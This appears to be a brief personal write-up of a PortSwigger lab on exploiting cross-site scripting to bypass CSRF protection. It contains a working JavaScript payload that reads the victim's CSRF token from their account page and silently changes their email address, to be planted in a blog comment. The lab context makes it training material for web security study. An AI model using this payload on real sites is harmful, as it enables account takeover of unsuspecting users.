# Exploiting XSS to bypass CSRF defenses

[link](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)

> the goal is to trigger an email reset on the victim but setting up a malicious email and using the csrf of the victim

```
<script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open("get", "/my-account", true);
  req.send();
  function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open("post", "/my-account/change-email", true);
    changeReq.send("csrf=" + token + "&email=test@test.com");
  }
</script>
```

- post it in a blog
